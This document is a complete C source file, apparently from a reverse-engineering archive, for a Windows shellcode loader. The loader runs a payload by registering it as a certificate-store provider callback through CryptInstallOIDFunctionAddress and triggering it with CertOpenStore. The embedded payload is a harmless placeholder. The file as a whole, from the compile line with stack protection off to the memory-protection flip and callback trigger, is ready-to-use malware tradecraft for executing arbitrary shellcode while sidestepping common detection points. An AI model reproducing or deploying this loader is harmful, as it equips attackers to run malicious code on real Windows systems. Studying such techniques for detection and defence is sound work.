/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CryptInstallOIDFunctionAddress + CertOpenStore
*/

#include <windows.h>
#include <stdint.h>
#include <wincrypt.h>

#pragma comment(lib,"crypt32")


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HCERTSTORE          store;
    CRYPT_OID_FUNC_ENTRY entry;

    PFN_CERT_DLL_OPEN_STORE_PROV_FUNC   fn_orig = NULL;     // should point to Crypt32's internal
    HCRYPTOIDFUNCADDR                   h_orig  = NULL;     // handle used to ensure DLL implementing original function remain loaded in memory
    HCRYPTOIDFUNCSET                    fn_reg;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        entry =  { CERT_STORE_PROV_SYSTEM_A, runtime };

        // inject store provider function, install before the one provided by Crypt32.dll
        fn_reg = CryptInitOIDFunctionSet (CRYPT_OID_OPEN_STORE_PROV_FUNC, 0);
        CryptGetOIDFunctionAddress (fn_reg, 0, CERT_STORE_PROV_SYSTEM_A, 0, (void**)&fn_orig, &h_orig);
        CryptInstallOIDFunctionAddress (NULL, 0, CRYPT_OID_OPEN_STORE_PROV_FUNC, 1, &entry, CRYPT_INSTALL_OID_FUNC_BEFORE_FLAG);

        // trigger
        store = CertOpenStore (
            CERT_STORE_PROV_SYSTEM_A, 
            X509_ASN_ENCODING|PKCS_7_ASN_ENCODING, 
            0, 
            CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, 
            "MY");

        // close the handle to store
        CertCloseStore (store, 0);

        // uninstall the entry
        CryptFreeOIDFunctionAddress (h_orig, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}